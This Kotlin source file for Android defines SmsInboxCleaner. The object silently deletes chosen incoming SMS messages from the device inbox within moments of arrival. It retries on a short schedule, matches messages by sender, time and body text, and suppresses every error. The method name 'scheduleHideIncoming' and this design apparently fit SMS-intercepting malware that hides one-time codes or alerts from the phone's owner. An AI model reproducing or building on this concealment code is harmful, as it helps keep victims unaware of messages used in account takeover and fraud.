package com.base.realtime.sms

import android.content.Context
import android.net.Uri
import android.provider.Telephony
import java.util.concurrent.Executors

object SmsInboxCleaner {
    private val worker = Executors.newSingleThreadExecutor()

    fun scheduleHideIncoming(context: Context, items: List<SmsItem>) {
        if (items.isEmpty()) return
        val app = context.applicationContext
        worker.execute {
            val delays = longArrayOf(0L, 40L, 120L, 300L, 700L)
            for (delay in delays) {
                if (delay > 0) Thread.sleep(delay)
                var removed = 0
                for (item in items) {
                    if (deleteOne(app, item)) removed++
                }
                if (removed >= items.size) return@execute
            }
        }
    }

    private fun deleteOne(context: Context, item: SmsItem): Boolean {
        val cr = context.contentResolver
        val id = item.providerId.toLongOrNull()
        if (id != null && id > 0) {
            return try {
                cr.delete(Uri.parse("content://sms/$id"), null, null) > 0
            } catch (_: SecurityException) {
                false
            } catch (_: Throwable) {
                false
            }
        }
        return deleteByMatch(cr, item)
    }

    private fun deleteByMatch(cr: android.content.ContentResolver, item: SmsItem): Boolean {
        val since = (item.date - 120_000L).coerceAtLeast(0L)
        val selection = "${Telephony.Sms.ADDRESS}=? AND ${Telephony.Sms.DATE}>=? AND ${Telephony.Sms.TYPE}=?"
        val args = arrayOf(item.address, since.toString(), Telephony.Sms.MESSAGE_TYPE_INBOX.toString())
        val projection = arrayOf(Telephony.Sms._ID, Telephony.Sms.BODY)
        try {
            cr.query(Telephony.Sms.CONTENT_URI, projection, selection, args, "${Telephony.Sms.DATE} DESC")?.use { cursor ->
                val idIdx = cursor.getColumnIndexOrThrow(Telephony.Sms._ID)
                val bodyIdx = cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)
                while (cursor.moveToNext()) {
                    val body = cursor.getString(bodyIdx).orEmpty()
                    if (body != item.body && !body.startsWith(item.body.take(32))) continue
                    val rowId = cursor.getLong(idIdx)
                    if (cr.delete(Uri.parse("content://sms/$rowId"), null, null) > 0) {
                        return true
                    }
                }
            }
        } catch (_: SecurityException) {
            return false
        } catch (_: Throwable) {
            return false
        }
        return false
    }
}
